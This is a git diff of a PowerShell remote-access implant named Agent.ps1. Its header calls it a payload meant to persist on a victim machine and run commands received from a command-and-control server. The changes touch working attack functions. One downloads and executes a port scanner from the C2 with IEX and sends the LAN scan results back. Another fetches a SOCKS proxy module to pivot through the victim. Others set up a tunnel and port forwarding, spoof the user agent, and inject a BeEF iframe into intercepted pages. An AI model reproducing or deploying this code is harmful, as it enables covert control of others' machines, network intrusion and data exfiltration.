@@ -1,6 +1,19 @@
 ﻿# Agent.ps1 - by @thebenygreen - @eyesopensec
 # This file is generated as pnt.ps1 by the Generator and can be renammed. it's the PAYLOAD that must persist on victim machine. 
 # It receive commands from C2 and execute it on victim machine. This file absolutely need to be CONFIGURED automatically by the generator.exe AND config.ini
+#-------------------------------------------
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ###############################################################################################################################
 
 $ErrorActionPreference = 'SilentlyContinue'  
@@ -153,7 +166,7 @@ if ($upgradepshell -eq "yes") {
 		}
 		function spoofUserAgent {
 			$BrowserProfile = @("Chrome","Firefox","Opera","Safari","InternetExplorer") | Get-Random 
-			$BrowserProfile
+			#$BrowserProfile
 			switch ($BrowserProfile) {
 				Chrome {$BotuserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome} 
 				Firefox {$BotuserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Firefox} 
@@ -765,7 +778,7 @@ Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserv
 			$result = "ok - may not work if NO winpcap lib (use !choco to install wnpcap lib";
 			sendC2 $pc $result $id;
 		   }
-	# Recon, Discovery &scanning  > BEGIN
+	# Recon, Discovery & Scanning  > BEGIN
 		Function ReconCommand {
 			[CmdletBinding()] param( 
 			[string]$id
@@ -800,13 +813,11 @@ Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserv
 			$result += " ---  Privileged Shell: $isAdmin "
 			sendC2 $pc $result $id
 			}			
-		Function NmapCommand { #!nmap|192.168.10.10 - Network port scanning like with Nmap, all over the LAN
+		Function NmapCommand { #!nmap|192.168.10.10 OR !nmap|  to scan all the LAN - Network port scanning like with Nmap, all over the LAN
             [CmdletBinding()] param( 
 			[string]$id
 			)
 			[string] $iptoscan = $LatestOrder.split('|')[1]
-			#[string] $visibility = $LatestOrder.split('|')[2]
-			#$command = @"
 			if ($iptoscan) {
 				$startip = $iptoscan 
 				$endip = $iptoscan
@@ -815,13 +826,12 @@ Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserv
 				$startip = $StartAddress 
 				$endip = $EndAddress
 				}
-			$result = "$c2c/ROOT_FOLDER/LINK_FOLDER/portscan.txt" 
-			sendC2 $pc $result $id
 			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/portscan.txt"));
 			portscan -StartAddress $startip -EndAddress $endip -ResolveHost -ScanPort | set-content $env:userprofile\AppData\scan.txt;
-			#"@
-			exfiltrate "$env:userprofile\AppData\scan.txt"
-			#RunJob -code $Command
+			$resultosend += [IO.File]::ReadAllText(".\scan.txt")
+			$result = $resultosend
+			sendC2 $pc $result $id
+			#exfiltrate "$env:userprofile\AppData\scan.txt"
 			}
 		Function VulnScanCommand { #!vulnscan - Vulnerabilities scanning like with Nessus (only local)
             [CmdletBinding()] param( 
@@ -1748,27 +1758,27 @@ $env:userprofile\Appdata\tun.exe $protocol $port --log=stdout > $env:userprofile
 "@
 			RunJob -code $c
 			if ($pshversion -lt 3) {
-				$result = $env:userprofile\AppData\cl.exe http://127.0.0.1:4040/api/tunnels
-				#executer -runLocal $Command2
+				$Command = "$env:userprofile\AppData\cl.exe http://127.0.0.1:4040/api/tunnels"
+				$result = executer -runLocal $Command
 			} else {
 				[string]$result = Invoke-WebRequest -Uri "http://127.0.0.1:4040/api/tunnels"
 			}
 			sendC2 $pc $result $id
 		}		
 		Function SocksProxyCommand {  # !socks|1234 -- Create a Socks 4/5 proxy on port 1234, configure your browser to use socks and browse in the context of this pc
-		[CmdletBinding()] param( 
-		[string]$id
-		)
-		[string] $bindport = $LatestOrder.split('|')[1]
-		(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/LINK_FOLDER/invksocks.psm1","$env:userprofile\invksocks.psm1")
-		$c = @"
+			[CmdletBinding()] param( 
+			[string]$id
+			)
+			[string] $bindport = $LatestOrder.split('|')[1]
+			(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/LINK_FOLDER/invksocks.psm1","$env:userprofile\invksocks.psm1")
+			$c = @"
 Import-Module "$env:userprofile\invksocks.psm1"
 Invoke-SocksProxy -bindPort $bindport
 "@
-		RunJob -code $c
-		$result = "Socks ready - Bind on $bindport"			
-		sendC2 $pc $result $id
-		}
+			RunJob -code $c
+			$result = "Socks ready - Bind on $bindport"			
+			sendC2 $pc $result $id
+			}
 		Function PortFwdCommand { 	 # !portfwd|33389|127.0.0.1|3389 -- Create a simple tcp port forward
 			[CmdletBinding()] param( 
 			[string]$id
